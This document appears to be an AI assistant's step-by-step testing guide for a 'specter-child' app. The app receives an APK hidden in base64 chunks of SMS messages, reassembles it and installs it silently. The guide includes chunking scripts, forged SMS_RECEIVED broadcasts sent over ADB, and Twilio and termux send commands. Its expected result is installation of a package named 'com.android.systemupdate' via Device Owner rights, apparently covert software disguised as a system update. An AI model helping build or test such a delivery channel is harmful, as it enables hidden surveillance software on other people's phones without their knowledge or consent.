# Testing SMS APK Delivery from PC

**Goal:** Test SMS delivery system using only PC + 1 phone
**Approach:** Staged testing - chunking → receiving → full send

---

## Method 1: Test Receiving with ADB (FASTEST)

**What:** Simulate SMS chunks arriving on phone using ADB broadcasts

### Step 1: Build and Install Child App
```bash
cd /home/gh0st/dvn/divine-workspace/apps/specter-child
./gradlew assembleMobileDebug
adb install -r app/build/outputs/apk/mobile/debug/app-mobile-debug.apk
```

### Step 2: Create Test APK to Send
```bash
# Create a small test APK (use the child APK itself)
TEST_APK=/tmp/test.apk
adb pull app/build/outputs/apk/mobile/debug/app-mobile-debug.apk $TEST_APK

# Check size
ls -lh $TEST_APK
```

### Step 3: Chunk the APK on PC
```python
#!/usr/bin/env python3
import base64
import sys

CHUNK_SIZE = 120
PREFIX = "SPK:"

def chunk_apk(apk_path):
    with open(apk_path, 'rb') as f:
        data = f.read()

    total_chunks = (len(data) + CHUNK_SIZE - 1) // CHUNK_SIZE
    print(f"APK size: {len(data)} bytes")
    print(f"Total chunks: {total_chunks}")

    chunks = []
    for i in range(total_chunks):
        start = i * CHUNK_SIZE
        end = min(start + CHUNK_SIZE, len(data))
        chunk_data = data[start:end]

        # Base64 encode
        b64_data = base64.b64encode(chunk_data).decode('ascii')

        # Format: SPK:1/100:base64data
        message = f"{PREFIX}{i+1}/{total_chunks}:{b64_data}"
        chunks.append(message)

    return chunks

if __name__ == '__main__':
    apk_file = sys.argv[1] if len(sys.argv) > 1 else '/tmp/test.apk'
    chunks = chunk_apk(apk_file)

    # Save chunks to file
    with open('/tmp/sms_chunks.txt', 'w') as f:
        for chunk in chunks:
            f.write(chunk + '\n')

    print(f"Chunks saved to /tmp/sms_chunks.txt")
    print(f"First chunk: {chunks[0][:80]}...")
```

### Step 4: Send Chunks via ADB
```bash
# Run the chunking script
python3 << 'EOF'
import base64
import sys

CHUNK_SIZE = 120
PREFIX = "SPK:"

apk_path = '/tmp/test.apk'
with open(apk_path, 'rb') as f:
    data = f.read()

total_chunks = (len(data) + CHUNK_SIZE - 1) // CHUNK_SIZE
print(f"Total chunks: {total_chunks}")

# Save chunks to file for ADB injection
with open('/tmp/sms_chunks.txt', 'w') as out:
    for i in range(total_chunks):
        start = i * CHUNK_SIZE
        end = min(start + CHUNK_SIZE, len(data))
        chunk_data = data[start:end]
        b64_data = base64.b64encode(chunk_data).decode('ascii')
        message = f"{PREFIX}{i+1}/{total_chunks}:{b64_data}"
        out.write(message + '\n')

print("Chunks saved to /tmp/sms_chunks.txt")
EOF

# Now send each chunk via ADB
while IFS= read -r message; do
    echo "Sending chunk: ${message:0:50}..."

    # Inject SMS_RECEIVED broadcast
    adb shell am broadcast \
        -a android.provider.Telephony.SMS_RECEIVED \
        --es pdus "$(echo -n "$message" | base64)" \
        --es format "3gpp"

    sleep 0.5  # Small delay between chunks
done < /tmp/sms_chunks.txt

echo "All chunks sent via ADB!"
```

### Step 5: Monitor Child Logcat
```bash
# In separate terminal, watch for chunks being received
adb logcat -c  # Clear log first
adb logcat | grep -E "SmsApk|Chunk|INSTALL"

# Expected output:
# SmsApkReceiver: Received APK chunk from unknown
# SmsApkReceiver: Parsed chunk: Chunk 1/102
# SmsApkReceiver: Progress: 1.0% (101 missing)
# ...
# SmsApkReceiver: All chunks received! Reassembling APK...
# SmsApkReceiver: APK reassembled: 1228800 bytes
# SmsApkReceiver: APK checksum: 123456789
# SmsApkReceiver: Installing APK: received_1234567890.apk
```

---

## Method 2: Web SMS Gateway (REAL SMS)

**What:** Send real SMS from PC using online service

### Option A: Twilio (Requires account)
```bash
# Install Twilio CLI
npm install -g twilio-cli

# Configure (need account SID + token from twilio.com)
twilio login

# Send test chunk
twilio api:core:messages:create \
  --from=+1234567890 \
  --to=+YOUR_PHONE \
  --body="SPK:1/1:dGVzdA=="
```

### Option B: Google Voice (Free)
1. Go to voice.google.com
2. Send text messages manually
3. Copy-paste chunks from `/tmp/sms_chunks.txt`
4. **Limitation:** Manual, slow, but free

### Option C: Android Debug Bridge SMS (Requires 2 devices)
```bash
# If you have TWO Android devices:
# Device 1 (sender): Run parent app OR use termux
termux-sms-send -n "+TARGET_PHONE" "SPK:1/1:dGVzdA=="

# Device 2 (receiver): Child app receives
```

---

## Method 3: Test Chunking Logic Only

**What:** Verify chunking/reassembly works without SMS

### Create Standalone Test
```bash
cd /home/gh0st/dvn/divine-workspace/apps/specter-child

# Create test directory
mkdir -p app/src/test/java/com/divine/specter/child/delivery

# Create test file
cat > app/src/test/java/com/divine/specter/child/delivery/SmsChunkerTest.java << 'EOF'
package com.divine.specter.child.delivery;

import org.junit.Test;
import static org.junit.Assert.*;

import java.io.File;
import java.io.FileOutputStream;
import java.util.List;
import java.util.Random;

public class SmsChunkerTest {

    @Test
    public void testChunkAndReassemble() throws Exception {
        // Create test APK (random data)
        File testApk = File.createTempFile("test", ".apk");
        byte[] originalData = new byte[1024 * 100]; // 100KB test file
        new Random().nextBytes(originalData);

        // Write ZIP header (PK\x03\x04)
        originalData[0] = 0x50; // P
        originalData[1] = 0x4B; // K
        originalData[2] = 0x03;
        originalData[3] = 0x04;

        FileOutputStream fos = new FileOutputStream(testApk);
        fos.write(originalData);
        fos.close();

        // Chunk the APK
        List<SmsChunker.ChunkInfo> chunks = SmsChunker.chunkApk(testApk);

        assertNotNull(chunks);
        assertTrue(chunks.size() > 0);

        System.out.println("Created " + chunks.size() + " chunks");

        // Create collection and reassemble
        SmsChunker.ChunkCollection collection =
            SmsChunker.createCollection(chunks.size());

        for (SmsChunker.ChunkInfo chunk : chunks) {
            byte[] chunkData = SmsChunker.decodeChunk(chunk);
            collection.addChunk(chunk.chunkNumber, chunkData);
        }

        assertTrue(collection.isComplete());

        // Reassemble
        byte[] reassembled = collection.reassemble();

        // Verify
        assertEquals(originalData.length, reassembled.length);
        assertArrayEquals(originalData, reassembled);

        // Verify APK structure
        assertTrue(SmsChunker.isValidApk(reassembled));

        System.out.println("✓ Chunking and reassembly successful!");

        testApk.delete();
    }

    @Test
    public void testChunkParsing() {
        String testMessage = "SPK:1/10:dGVzdGRhdGE=";

        SmsChunker.ChunkInfo chunk = SmsChunker.parseChunk(testMessage);

        assertNotNull(chunk);
        assertEquals(1, chunk.chunkNumber);
        assertEquals(10, chunk.totalChunks);
        assertEquals("dGVzdGRhdGE=", chunk.base64Data);

        System.out.println("✓ Chunk parsing successful!");
    }

    @Test
    public void testInvalidChunks() {
        // Test invalid formats
        assertNull(SmsChunker.parseChunk("INVALID"));
        assertNull(SmsChunker.parseChunk("SPK:invalid"));
        assertNull(SmsChunker.parseChunk("SPK:1/10"));  // Missing data

        System.out.println("✓ Invalid chunk detection works!");
    }
}
EOF

# Run tests
./gradlew test --tests "*SmsChunkerTest"

# Expected output:
# > Task :app:testMobileDebugUnitTest
#
# SmsChunkerTest > testChunkAndReassemble() PASSED
# SmsChunkerTest > testChunkParsing() PASSED
# SmsChunkerTest > testInvalidChunks() PASSED
#
# BUILD SUCCESSFUL
```

---

## Recommended Testing Order

### 1. Unit Tests First (5 minutes)
```bash
cd /home/gh0st/dvn/divine-workspace/apps/specter-child
./gradlew test --tests "*SmsChunkerTest"
```
**Verifies:** Chunking logic works correctly

### 2. ADB Injection Test (10 minutes)
```bash
# Build and install
./gradlew assembleMobileDebug
adb install -r app/build/outputs/apk/mobile/debug/app-mobile-debug.apk

# Run Python script to send chunks via ADB
python3 /tmp/test_sms_injection.py

# Monitor logcat
adb logcat | grep SmsApk
```
**Verifies:** Receiver works, reassembly works, installation works

### 3. Real SMS Test (if needed)
```bash
# Use Twilio or Google Voice to send real SMS
# Or wait until you have parent device to test full flow
```

---

## Quick Test Script (All-in-One)

```bash
#!/bin/bash
# Complete SMS APK Delivery Test

echo "=== SMS APK Delivery Test ==="

# 1. Build child app
echo "[1/5] Building child app..."
cd /home/gh0st/dvn/divine-workspace/apps/specter-child
./gradlew assembleMobileDebug

# 2. Install on phone
echo "[2/5] Installing on phone..."
adb install -r app/build/outputs/apk/mobile/debug/app-mobile-debug.apk

# 3. Prepare test APK
echo "[3/5] Preparing test APK..."
TEST_APK=/tmp/test_small.apk
adb pull app/build/outputs/apk/mobile/debug/app-mobile-debug.apk $TEST_APK

# 4. Create chunks
echo "[4/5] Creating chunks..."
python3 << 'PYTHON'
import base64
apk_path = '/tmp/test_small.apk'
with open(apk_path, 'rb') as f:
    data = f.read()
total = (len(data) + 119) // 120
print(f"Total chunks: {total}")
with open('/tmp/chunks.txt', 'w') as out:
    for i in range(total):
        chunk = data[i*120:(i+1)*120]
        b64 = base64.b64encode(chunk).decode()
        out.write(f"SPK:{i+1}/{total}:{b64}\n")
PYTHON

# 5. Start logcat monitor
echo "[5/5] Starting logcat monitor..."
adb logcat -c
gnome-terminal -- bash -c "adb logcat | grep -E 'SmsApk|Chunk|INSTALL'; exec bash"

# 6. Inject SMS chunks
echo "Injecting SMS chunks (this may take a minute)..."
sleep 2

count=0
while IFS= read -r msg; do
    count=$((count + 1))
    adb shell am broadcast \
        -a android.provider.Telephony.SMS_RECEIVED \
        --es message "$msg" >/dev/null 2>&1

    if [ $((count % 10)) -eq 0 ]; then
        echo "  Sent $count chunks..."
    fi
    sleep 0.1
done < /tmp/chunks.txt

echo "✓ Test complete! Check logcat window for results."
```

---

## Expected Results

### Success Indicators:
```
✓ All chunks parsed correctly
✓ Progress shows 100%
✓ APK reassembled (verify checksum)
✓ APK structure valid (ZIP header check)
✓ Installation triggered
✓ Package installed: com.android.systemupdate
```

### Failure Indicators:
```
✗ "Failed to parse chunk" → Protocol issue
✗ "Invalid APK file structure" → Reassembly issue
✗ "Installation failed" → Device Owner issue
```

---

## Which Method Do You Want to Start With?

**Option 1: Unit Tests** (Fastest, safest)
- Just run `./gradlew test`
- No phone needed
- **Recommended first step**

**Option 2: ADB Injection** (Most realistic)
- Uses your phone
- Tests full receive path
- No SMS costs

**Option 3: Real SMS** (Full E2E)
- Requires Twilio/Google Voice
- Tests actual SMS delivery
- **Save for final validation**

**I recommend starting with Option 1 (Unit Tests), then Option 2 (ADB Injection). Ready to proceed?**
